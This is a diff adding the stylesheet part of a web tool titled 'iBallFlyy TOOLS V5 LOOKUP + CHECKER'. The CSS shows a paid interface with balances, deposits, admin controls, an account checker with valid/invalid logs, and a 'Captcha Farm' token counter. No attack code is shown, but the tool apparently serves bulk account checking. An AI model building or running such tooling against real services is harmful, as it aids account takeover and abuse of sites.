@@ -1,0 +1,3774 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>iBallFlyy TOOLS V5 ✦ LOOKUP + CHECKER</title>
+    
+    <!-- Font Awesome 6 -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    
+    <style>
+        /* ========== CSS UPDATE - BIRU CERAH ========== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background: linear-gradient(145deg, #0066ff 0%, #0044cc 100%);
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+            color: #fff;
+        }
+
+        :root {
+            --primary: #0066ff;
+            --primary-dark: #0044cc;
+            --primary-soft: #4d94ff;
+            --primary-glow: #0066ff;
+            --primary-deep: #003399;
+            --bg-deep: #0044cc;
+            --bg-card: rgba(255, 255, 255, 0.1);
+            --card-border: rgba(255, 255, 255, 0.2);
+            --text-blue: #ffffff;
+            --success: #00ff88;
+            --warning: #ffaa00;
+            --danger: #ff4444;
+        }
+
+        .gradient-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
+            background: linear-gradient(145deg, #0066ff, #0044cc);
+        }
+
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 16px;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Loading Screen */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0066ff;
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.5s ease;
+        }
+        
+        .loading-screen.hide {
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        .loading-content {
+            text-align: center;
+        }
+        
+        .loading-logo {
+            font-size: 3rem;
+            font-weight: 800;
+            color: #fff;
+            text-shadow: 0 0 20px rgba(255,255,255,0.5);
+            margin-bottom: 20px;
+            animation: pulseLogo 2s infinite;
+        }
+        
+        @keyframes pulseLogo {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        
+        .loading-bar {
+            width: 200px;
+            height: 4px;
+            background: rgba(255,255,255,0.3);
+            border-radius: 4px;
+            margin: 20px auto;
+            overflow: hidden;
+        }
+        
+        .loading-progress {
+            width: 0%;
+            height: 100%;
+            background: #fff;
+            animation: progress 2s ease forwards;
+        }
+        
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        
+        .loading-text {
+            color: rgba(255,255,255,0.8);
+            font-size: 0.9rem;
+            margin-top: 10px;
+        }
+
+        /* Login Screen */
+        .login-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0066ff;
+            z-index: 9000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.5s ease;
+            overflow-y: auto;
+            padding: 20px;
+        }
+        
+        .login-screen.hide {
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        .login-card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            border: 2px solid rgba(255,255,255,0.2);
+            border-radius: 40px;
+            padding: 30px 20px;
+            width: 100%;
+            max-width: 380px;
+            box-shadow: 0 30px 60px -20px rgba(0,0,0,0.3);
+            animation: fadeInUp 0.6s ease;
+        }
+        
+        .login-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .login-header h2 {
+            font-size: 2rem;
+            font-weight: 800;
+            color: #fff;
+            margin-bottom: 10px;
+        }
+        
+        .login-header p {
+            color: rgba(255,255,255,0.8);
+            font-size: 0.9rem;
+        }
+        
+        .login-tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 25px;
+            background: rgba(0,0,0,0.2);
+            padding: 5px;
+            border-radius: 50px;
+        }
+        
+        .login-tab {
+            flex: 1;
+            text-align: center;
+            padding: 12px;
+            border-radius: 40px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            color: rgba(255,255,255,0.8);
+        }
+        
+        .login-tab.active {
+            background: #fff;
+            color: #0066ff;
+        }
+        
+        .login-form {
+            display: none;
+        }
+        
+        .login-form.active {
+            display: block;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 15px 18px;
+            background: rgba(0,0,0,0.2);
+            border: 2px solid rgba(255,255,255,0.2);
+            border-radius: 30px;
+            color: #fff;
+            font-size: 1rem;
+            margin-bottom: 16px;
+        }
+        
+        .input-field:focus {
+            outline: none;
+            border-color: #fff;
+            background: rgba(0,0,0,0.3);
+        }
+        
+        .input-field::placeholder {
+            color: rgba(255,255,255,0.5);
+        }
+        
+        .login-btn {
+            background: #fff;
+            color: #0066ff;
+            border: none;
+            padding: 16px;
+            border-radius: 40px;
+            font-size: 1.1rem;
+            font-weight: 800;
+            width: 100%;
+            cursor: pointer;
+            margin-top: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.2s ease;
+        }
+        
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+        }
+        
+        .login-btn:active {
+            transform: translateY(2px);
+        }
+        
+        .login-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .login-note {
+            text-align: center;
+            margin-top: 20px;
+            color: rgba(255,255,255,0.5);
+            font-size: 0.8rem;
+        }
+
+        /* Alert */
+        .alert {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.8);
+            color: #fff;
+            padding: 12px 24px;
+            border-radius: 40px;
+            font-size: 0.9rem;
+            z-index: 10000;
+            display: none;
+            align-items: center;
+            gap: 8px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            backdrop-filter: blur(10px);
+            border: 2px solid rgba(255,255,255,0.2);
+            max-width: 90%;
+        }
+        
+        .alert.show {
+            display: flex;
+            animation: slideDown 0.3s ease;
+        }
+        
+        .alert.success {
+            border-color: #00ff88;
+        }
+        
+        .alert.error {
+            border-color: #ff4444;
+        }
+        
+        .alert.warning {
+            border-color: #ffaa00;
+        }
+        
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translate(-50%, -20px);
+            }
+            to {
+                opacity: 1;
+                transform: translate(-50%, 0);
+            }
+        }
+
+        /* Sidebar Toggle */
+        .sidebar-toggle {
+            position: fixed;
+            top: 16px;
+            left: 16px;
+            width: 44px;
+            height: 44px;
+            background: rgba(255,255,255,0.2);
+            backdrop-filter: blur(10px);
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            z-index: 1000;
+            color: #fff;
+            font-size: 1.5rem;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            position: fixed;
+            top: 0;
+            left: -380px;
+            width: 280px;
+            height: 100vh;
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(20px);
+            border-right: 2px solid rgba(255,255,255,0.2);
+            z-index: 999;
+            transition: left 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            padding: 80px 20px 20px;
+            overflow-y: auto;
+        }
+
+        .sidebar.open {
+            left: 0;
+        }
+
+        .sidebar-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(5px);
+            z-index: 998;
+            display: none;
+        }
+
+        .sidebar-overlay.show {
+            display: block;
+        }
+
+        .sidebar-header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid rgba(255,255,255,0.2);
+        }
+
+        .sidebar-header i {
+            font-size: 2.2em;
+            color: #fff;
+        }
+
+        .sidebar-header h3 {
+            color: #fff;
+            font-size: 1.3em;
+            font-weight: 700;
+        }
+
+        .user-info-sidebar {
+            background: rgba(255,255,255,0.1);
+            border: 2px solid rgba(255,255,255,0.2);
+            border-radius: 25px;
+            padding: 18px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .user-avatar {
+            width: 60px;
+            height: 60px;
+            background: #fff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+            font-size: 2rem;
+            color: #0066ff;
+        }
+        
+        .user-name-sidebar {
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 5px;
+        }
+        
+        .user-role-sidebar {
+            display: inline-block;
+            background: rgba(255,255,255,0.2);
+            padding: 4px 12px;
+            border-radius: 30px;
+            font-size: 0.8rem;
+            color: #fff;
+            margin-bottom: 12px;
+        }
+        
+        .balance-box {
+            background: rgba(0,0,0,0.2);
+            border-radius: 20px;
+            padding: 12px;
+            margin: 15px 0;
+        }
+        
+        .balance-label {
+            color: rgba(255,255,255,0.8);
+            font-size: 0.8rem;
+            margin-bottom: 5px;
+        }
+        
+        .balance-value {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: #ffaa00;
+        }
+        
+        .vip-badge-sidebar {
+            display: inline-block;
+            background: #ffaa00;
+            color: #000;
+            padding: 5px 15px;
+            border-radius: 30px;
+            font-weight: 600;
+            font-size: 0.8rem;
+        }
+        
+        .admin-badge {
+            display: inline-block;
+            background: #ff4444;
+            color: #fff;
+            padding: 5px 15px;
+            border-radius: 30px;
+            font-weight: 600;
+            font-size: 0.8rem;
+            margin-left: 5px;
+        }
+        
+        .blocked-badge {
+            display: inline-block;
+            background: #888;
+            color: #fff;
+            padding: 5px 15px;
+            border-radius: 30px;
+            font-weight: 600;
+            font-size: 0.8rem;
+            margin-left: 5px;
+        }
+
+        .sidebar-menu {
+            list-style: none;
+        }
+
+        .sidebar-menu li {
+            margin-bottom: 10px;
+        }
+
+        .sidebar-menu a {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 12px 18px;
+            color: #fff;
+            text-decoration: none;
+            border-radius: 20px;
+            transition: all 0.3s ease;
+            background: rgba(255,255,255,0.05);
+        }
+
+        .sidebar-menu a:hover {
+            background: rgba(255,255,255,0.2);
+            transform: translateX(5px);
+        }
+
+        .sidebar-menu a i {
+            width: 25px;
+        }
+
+        /* Header */
+        .header {
+            padding: 25px 15px;
+            margin-bottom: 20px;
+            text-align: center;
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 40px;
+            border: 2px solid rgba(255,255,255,0.2);
+        }
+
+        .header h1 {
+            font-size: 2rem;
+            font-weight: 800;
+            color: #fff;
+            margin-bottom: 8px;
+        }
+
+        .header p {
+            color: rgba(255,255,255,0.8);
+            font-size: 0.9rem;
+        }
+
+        .header-stats {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 15px;
+        }
+
+        .stat-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: #fff;
+            background: rgba(255,255,255,0.1);
+            padding: 6px 14px;
+            border-radius: 50px;
+            font-size: 0.8rem;
+        }
+
+        /* Balance Card */
+        .balance-card {
+            background: rgba(255,255,255,0.1);
+            border: 2px solid rgba(255,255,255,0.2);
+            border-radius: 30px;
+            padding: 20px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            backdrop-filter: blur(10px);
+        }
+        
+        .balance-info .label {
+            color: rgba(255,255,255,0.8);
+            font-size: 0.9rem;
+            margin-bottom: 5px;
+        }
+        
+        .balance-info .amount {
+            font-size: 2.2rem;
+            font-weight: 800;
+            color: #ffaa00;
+        }
+        
+        .balance-info .vip-status-badge {
+            display: inline-block;
+            background: #ffaa00;
+            color: #000;
+            padding: 4px 15px;
+            border-radius: 30px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            margin-top: 5px;
+        }
+        
+        .balance-info .admin-status-badge {
+            display: inline-block;
+            background: #ff4444;
+            color: #fff;
+            padding: 4px 15px;
+            border-radius: 30px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            margin-top: 5px;
+        }
+        
+        .balance-icon {
+            font-size: 3rem;
+            color: #ffaa00;
+            opacity: 0.5;
+        }
+
+        /* Back Button */
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            color: #fff;
+            background: rgba(255,255,255,0.1);
+            padding: 10px 20px;
+            border-radius: 30px;
+            margin-bottom: 16px;
+            cursor: pointer;
+            border: 2px solid rgba(255,255,255,0.2);
+            width: fit-content;
+        }
+        
+        .back-button:hover {
+            background: rgba(255,255,255,0.2);
+        }
+
+        /* Menu Grid */
+        .menu-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+
+        .menu-card {
+            padding: 12px 4px;
+            text-align: center;
+            cursor: pointer;
+            background: rgba(255,255,255,0.1);
+            border: 2px solid rgba(255,255,255,0.2);
+            border-radius: 20px;
+            transition: all 0.3s ease;
+        }
+
+        .menu-card:hover {
+            transform: translateY(-2px);
+            background: rgba(255,255,255,0.2);
+        }
+
+        .menu-card.active {
+            border-color: #ffaa00;
+            background: rgba(255,170,0,0.2);
+        }
+
+        .menu-card.disabled-feature {
+            opacity: 0.3;
+            pointer-events: none;
+        }
+
+        .menu-icon i {
+            font-size: 1.5rem;
+            color: #fff;
+            margin-bottom: 4px;
+        }
+
+        .menu-card h3 {
+            color: #fff;
+            margin-bottom: 3px;
+            font-size: 0.7rem;
+            font-weight: 700;
+        }
+
+        .price-badge {
+            display: inline-block;
+            background: #ffaa00;
+            color: #000;
+            padding: 2px 6px;
+            border-radius: 40px;
+            font-size: 0.5rem;
+            font-weight: 600;
+        }
+
+        /* Input Section */
+        .input-section {
+            padding: 20px 14px;
+            margin-bottom: 20px;
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            border: 2px solid rgba(255,255,255,0.2);
+            border-radius: 30px;
+        }
+
+        .section-title {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 18px;
+        }
+
+        .section-title i {
+            font-size: 1.6rem;
+            color: #fff;
+            background: rgba(255,255,255,0.1);
+            padding: 10px;
+            border-radius: 18px;
+        }
+
+        .section-title h2 {
+            color: #fff;
+            font-size: 1.2rem;
+            font-weight: 700;
+        }
+
+        .price-info-card {
+            background: rgba(255,170,0,0.2);
+            border: 2px solid #ffaa00;
+            border-radius: 25px;
+            padding: 14px 18px;
+            margin-bottom: 18px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            backdrop-filter: blur(10px);
+        }
+
+        .price-info-card i {
+            font-size: 1.6rem;
+            color: #ffaa00;
+        }
+
+        .price-info-card .price-text {
+            color: #fff;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+
+        .price-info-card .price-value {
+            color: #ffaa00;
+            font-weight: 800;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+        }
+
+        .input-label {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            margin-bottom: 6px;
+            color: #fff;
+            font-size: 0.85rem;
+            margin-left: 8px;
+        }
+
+        .input-label i {
+            color: #fff;
+        }
+
+        .input-field input, .input-field textarea {
+            width: 100%;
+            padding: 14px 16px;
+            background: rgba(0,0,0,0.2);
+            border: 2px solid rgba(255,255,255,0.2);
+            border-radius: 25px;
+            font-size: 0.95rem;
+            color: #fff;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .input-field textarea {
+            min-height: 80px;
+            resize: vertical;
+        }
+
+        .input-field input:focus, .input-field textarea:focus {
+            outline: none;
+            border-color: #fff;
+        }
+
+        /* Button */
+        .btn {
+            background: #fff;
+            color: #0066ff;
+            border: none;
+            padding: 16px 22px;
+            border-radius: 30px;
+            font-size: 1rem;
+            font-weight: 800;
+            cursor: pointer;
+            width: 100%;
+            margin: 8px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: all 0.2s ease;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+        }
+
+        .btn:active {
+            transform: translateY(2px);
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-success {
+            background: #00ff88;
+            color: #000;
+        }
+
+        .btn-warning {
+            background: #ffaa00;
+            color: #000;
+        }
+
+        .btn-danger {
+            background: #ff4444;
+            color: #fff;
+        }
+
+        /* Tutorial Button */
+        .tutorial-btn {
+            background: #00ff88;
+            color: #000;
+            border: none;
+            padding: 16px 22px;
+            border-radius: 30px;
+            font-size: 1rem;
+            font-weight: 800;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        /* Info Card */
+        .info-card {
+            background: rgba(255,255,255,0.1);
+            border: 2px solid rgba(255,255,255,0.2);
+            border-radius: 25px;
+            padding: 14px;
+            margin-bottom: 18px;
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+
+        .info-icon {
+            width: 40px;
+            height: 40px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .info-icon i {
+            font-size: 1.6rem;
+            color: #fff;
+        }
+
+        .info-content p {
+            color: #fff;
+            font-weight: 600;
+            margin-bottom: 4px;
+            font-size: 0.9rem;
+        }
+
+        .info-content small {
+            color: rgba(255,255,255,0.6);
+        }
+
+        /* Result Section */
+        .result-section {
+            padding: 20px 14px;
+            margin-bottom: 20px;
+            display: none;
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            border: 2px solid rgba(255,255,255,0.2);
+            border-radius: 30px;
+        }
+
+        .result-section.show {
+            display: block;
+        }
+
+        .result-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+            padding-bottom: 12px;
+            border-bottom: 2px solid rgba(255,255,255,0.2);
+        }
+
+        .result-header h3 {
+            color: #fff;
+            font-size: 1.2rem;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .result-badge {
+            background: #00ff88;
+            color: #000;
+            padding: 5px 14px;
+            border-radius: 40px;
+            font-size: 0.75rem;
+            font-weight: 700;
+        }
+
+        .result-profile .name {
+            font-size: 1.5rem;
+            font-weight: 800;
+            color: #fff;
+            margin-bottom: 5px;
+        }
+
+        .result-profile .id {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9rem;
+            color: rgba(255,255,255,0.8);
+        }
+
+        .info-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 15px;
+            background: rgba(0,0,0,0.2);
+            border-radius: 15px;
+            margin-bottom: 8px;
+            border-left: 3px solid #ffaa00;
+        }
+
+        .info-item .label {
+            color: rgba(255,255,255,0.6);
+            font-size: 0.8rem;
+        }
+
+        .info-item .value {
+            color: #fff;
+            font-weight: 600;
+            font-size: 0.9rem;
+            text-align: right;
+        }
+
+        /* Ban Status Colors */
+        .banned-status {
+            color: #ff4444 !important;
+            font-weight: 800;
+        }
+        
+        .active-status {
+            color: #00ff88 !important;
+            font-weight: 800;
+        }
+
+        /* Loading */
+        .loading {
+            text-align: center;
+            padding: 35px;
+            display: none;
+        }
+
+        .loading.show {
+            display: block;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 12px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Error Message */
+        .error-message {
+            background: rgba(255,68,68,0.2);
+            border: 2px solid #ff4444;
+            border-radius: 25px;
+            padding: 14px;
+            margin-top: 18px;
+            display: none;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .error-message.show {
+            display: flex;
+        }
+
+        .error-message i {
+            font-size: 1.4rem;
+            color: #ff4444;
+        }
+
+        .error-message span {
+            color: #ff8888;
+        }
+
+        /* Modal */
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(10px);
+            z-index: 2000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+        }
+
+        .modal.show {
+            display: flex;
+        }
+
+        .modal-content {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(20px);
+            border: 2px solid rgba(255,255,255,0.2);
+            border-radius: 35px;
+            max-width: 450px;
+            width: 100%;
+            max-height: 85vh;
+            overflow-y: auto;
+        }
+
+        .modal-header {
+            padding: 18px;
+            border-bottom: 2px solid rgba(255,255,255,0.2);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            background: rgba(0,102,255,0.95);
+            z-index: 10;
+        }
+
+        .modal-header h3 {
+            color: #fff;
+            font-size: 1.2rem;
+        }
+
+        .modal-close {
+            width: 36px;
+            height: 36px;
+            background: rgba(255,255,255,0.1);
+            border: 2px solid rgba(255,255,255,0.2);
+            border-radius: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            cursor: pointer;
+        }
+
+        .modal-body {
+            padding: 18px;
+        }
+
+        /* Admin Dashboard */
+        .admin-dashboard {
+            max-width: 500px;
+            width: 100%;
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        
+        .stat-card {
+            background: rgba(255,255,255,0.1);
+            border: 2px solid rgba(255,255,255,0.2);
+            border-radius: 25px;
+            padding: 15px;
+            text-align: center;
+        }
+        
+        .stat-card .stat-icon {
+            font-size: 2rem;
+            color: #fff;
+            margin-bottom: 8px;
+        }
+        
+        .stat-card .stat-value {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: #fff;
+            margin-bottom: 5px;
+        }
+        
+        .stat-card .stat-label {
+            color: rgba(255,255,255,0.8);
+            font-size: 0.8rem;
+        }
+        
+        .revenue-card {
+            background: rgba(255,170,0,0.2);
+            border: 2px solid #ffaa00;
+            border-radius: 25px;
+            padding: 20px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .revenue-card .revenue-icon {
+            font-size: 2.5rem;
+            color: #ffaa00;
+            margin-bottom: 10px;
+        }
+        
+        .revenue-card .revenue-value {
+            font-size: 2.2rem;
+            font-weight: 800;
+            color: #ffaa00;
+            margin-bottom: 5px;
+        }
+        
+        .revenue-card .revenue-label {
+            color: #fff;
+            font-size: 0.9rem;
+        }
+        
+        .user-list {
+            max-height: 300px;
+            overflow-y: auto;
+            margin: 15px 0;
+        }
+        
+        .user-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: rgba(255,255,255,0.1);
+            border: 2px solid rgba(255,255,255,0.2);
+            border-radius: 18px;
+            padding: 12px;
+            margin-bottom: 8px;
+        }
+        
+        .user-item.blocked {
+            background: rgba(255,68,68,0.2);
+            border-color: #ff4444;
+        }
+        
+        .user-info .username {
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 4px;
+        }
+        
+        .user-info .balance {
+            font-size: 0.8rem;
+            color: #ffaa00;
+        }
+        
+        .user-role {
+            font-size: 0.7rem;
+            padding: 3px 8px;
+            border-radius: 15px;
+            background: rgba(255,255,255,0.2);
+            color: #fff;
+        }
+        
+        .user-role.admin {
+            background: #ff4444;
+        }
+        
+        .user-actions {
+            display: flex;
+            gap: 5px;
+        }
+        
+        .action-btn {
+            width: 32px;
+            height: 32px;
+            border-radius: 16px;
+            border: 2px solid rgba(255,255,255,0.2);
+            background: rgba(255,255,255,0.1);
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+        
+        .action-btn:hover {
+            background: rgba(255,255,255,0.2);
+        }
+
+        /* Checker Page */
+        .checker-page {
+            display: none;
+        }
+        
+        .checker-page.active {
+            display: block;
+        }
+        
+        .tab-container {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 16px;
+            flex-wrap: wrap;
+        }
+        
+        .tab-btn {
+            flex: 1;
+            padding: 12px;
+            background: rgba(255,255,255,0.1);
+            border: 2px solid rgba(255,255,255,0.2);
+            border-radius: 20px;
+            color: #fff;
+            font-weight: 600;
+            cursor: pointer;
+            text-align: center;
+            min-width: 80px;
+        }
+        
+        .tab-btn.active {
+            background: #fff;
+            color: #0066ff;
+            border-color: #fff;
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        /* Captcha Farm - FULL SIZE */
+        .captcha-mode-switch {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .mode-btn {
+            flex: 1;
+            padding: 12px;
+            background: rgba(255,255,255,0.1);
+            border: 2px solid rgba(255,255,255,0.2);
+            border-radius: 20px;
+            color: #fff;
+            font-weight: 600;
+            cursor: pointer;
+            text-align: center;
+        }
+        
+        .mode-btn.active {
+            background: #fff;
+            color: #0066ff;
+        }
+        
+        .captcha-mode-content {
+            display: none;
+        }
+        
+        .captcha-mode-content.active {
+            display: block;
+        }
+        
+        .captcha-container {
+            display: grid;
+            grid-template-columns: repeat(1, 1fr);
+            gap: 15px;
+            margin: 20px 0;
+        }
+        
+        .captcha-box {
+            background: rgba(0,0,0,0.3);
+            border: 2px solid rgba(255,255,255,0.2);
+            border-radius: 20px;
+            padding: 15px;
+            min-height: 320px;
+            width: 100%;
+        }
+        
+        .captcha-box iframe {
+            width: 100%;
+            height: 300px;
+            border: none;
+            border-radius: 12px;
+            background: #f0f0f0;
+        }
+        
+        .token-counter {
+            background: rgba(255,255,255,0.1);
+            border: 2px solid rgba(255,255,255,0.2);
+            border-radius: 30px;
+            padding: 8px 16px;
+            display: inline-block;
+            margin-bottom: 10px;
+            color: #fff;
+        }
+        
+        .upload-area {
+            border: 2px dashed rgba(255,255,255,0.3);
+            border-radius: 25px;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            margin: 10px 0;
+        }
+        
+        .upload-area:hover {
+            background: rgba(255,255,255,0.1);
+        }
+        
+        .upload-area i {
+            font-size: 2rem;
+            color: #fff;
+            margin-bottom: 8px;
+        }
+        
+        .file-info {
+            background: rgba(255,255,255,0.1);
+            border: 2px solid #00ff88;
+            border-radius: 15px;
+            padding: 10px;
+            margin: 10px 0;
+            display: none;
+            align-items: center;
+            gap: 8px;
+            color: #fff;
+        }
+        
+        .file-info.show {
+            display: flex;
+        }
+        
+        .file-info i.fa-check-circle {
+            color: #00ff88;
+        }
+        
+        .remove-file {
+            color: #ff4444;
+            margin-left: auto;
+            cursor: pointer;
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin: 20px 0;
+        }
+        
+        .stat-card .stat-value {
+            font-size: 1.5rem;
+            font-weight: 700;
+        }
+        
+        .download-buttons {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin: 15px 0;
+        }
+        
+        .download-btn {
+            padding: 12px;
+            background: rgba(255,255,255,0.1);
+            border: 2px solid rgba(255,255,255,0.2);
+            border-radius: 20px;
+            color: #fff;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+        }
+        
+        .download-btn:hover:not(:disabled) {
+            background: rgba(255,255,255,0.2);
+        }
+        
+        .download-btn:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+        }
+        
+        .log-section {
+            margin-top: 20px;
+        }
+        
+        .log-content {
+            background: rgba(0,0,0,0.3);
+            border-radius: 15px;
+            padding: 12px;
+            max-height: 150px;
+            overflow-y: auto;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.7rem;
+            color: #fff;
+        }
+        
+        .log-entry {
+            padding: 3px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .log-entry.valid { color: #00ff88; }
+        .log-entry.invalid { color: #ff4444; }
+        
+        .result-preview {
+            background: rgba(0,0,0,0.3);
+            border-radius: 15px;
+            padding: 12px;
+            margin: 15px 0;
+            max-height: 150px;
+            overflow-y: auto;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.7rem;
+        }
+
+        /* Deposit Grid */
+        .deposit-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin: 20px 0;
+        }
+        
+        .deposit-card {
+            background: rgba(255,255,255,0.1);
+            border: 2px solid rgba(255,255,255,0.2);
+            border-radius: 25px;
+            padding: 15px;
+            text-align: center;
+            cursor: pointer;
+        }
+        
+        .deposit-card.selected {
+            border-color: #ffaa00;
+            background: rgba(255,170,0,0.2);
+        }
+        
+        .deposit-card .amount {
+            font-size: 1.3rem;
+            font-weight: 800;
+            color: #ffaa00;
+            margin-bottom: 5px;
+        }
+
+        /* Payment Info */
+        .payment-info {
+            background: rgba(255,255,255,0.1);
+            border: 2px solid rgba(255,255,255,0.2);
+            border-radius: 22px;
+            padding: 14px;
+            margin: 18px 0;
+        }
+
+        .payment-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 8px 0;
+            color: #fff;
+        }
+
+        .payment-item i {
+            width: 28px;
